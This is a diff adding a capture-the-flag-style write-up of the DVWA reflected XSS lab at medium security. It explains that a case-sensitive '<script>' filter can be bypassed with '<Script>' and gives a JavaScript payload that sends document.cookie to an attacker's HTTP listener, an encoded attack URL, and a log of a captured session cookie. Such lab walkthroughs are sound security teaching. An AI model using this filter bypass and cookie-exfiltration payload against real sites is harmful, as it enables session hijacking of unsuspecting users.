@@ -1,0 +1,62 @@
+#+TITLE: DVWA - XSS Reflected Medium
+#+AUTHOR: Leonardo Tamiano
+
+* Description
+  The difference between the ~low~ and ~medium~ is that now there's a
+  little bit of input cleaning. In particular, the simply tag ~<script>~
+  gets removed as we can see from the code
+
+  #+begin_src php
+<?php
+
+header ("X-XSS-Protection: 0");
+
+// Is there any input?
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    // Get input
+    $name = str_replace( '<script>', '', $_GET[ 'name' ] );
+
+    // Feedback for end user
+    echo "<pre>Hello ${name}</pre>";
+}
+
+?>
+  #+end_src
+
+* Solution
+  The bypass is pretty straight forward, and it relies on the fact
+  that the script tag is not case sensitive, while the filtering is,
+  which means we can simply put ~<Script>~ and it will work again.
+
+  #+begin_example
+<Script> alert(1); </Script>
+  #+end_example
+
+  Once again, if we want to leak the cookie we start an http server
+
+  #+begin_src sh
+python3 -m http.server 1337
+  #+end_src
+
+  and then we prepare the following JS payload
+
+  #+begin_src js
+var xhr = new XMLHttpRequest();
+xhr.open('GET', `http://localhost:1337/${document.cookie}`, false);
+xhr.send(null);
+  #+end_src
+
+  which is sent over the discovered XSS
+
+  #+begin_example
+http://evil/vulnerabilities/xss_r/?name=%3CScript%3E+var+xhr+%3D+new+XMLHttpRequest%28%29%3B+xhr.open%28%27GET%27%2C+%60http%3A%2F%2Flocalhost%3A1337%2F%24%7Bdocument.cookie%7D%60%2C+false%29%3B+xhr.send%28null%29%3B+%3C%2FScript%3E
+  #+end_example
+
+  when the user clicks on that link, we get his cookie
+
+  #+begin_example
+[leo@archlinux xss_reflected]$ python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+127.0.0.1 - - [07/Nov/2023 19:02:01] code 404, message File not found
+127.0.0.1 - - [07/Nov/2023 19:02:01] "GET /PHPSESSID=301dckse7uvq2hn6dbmu9o62t2;%20security=medium HTTP/1.1" 404 
+  #+end_example
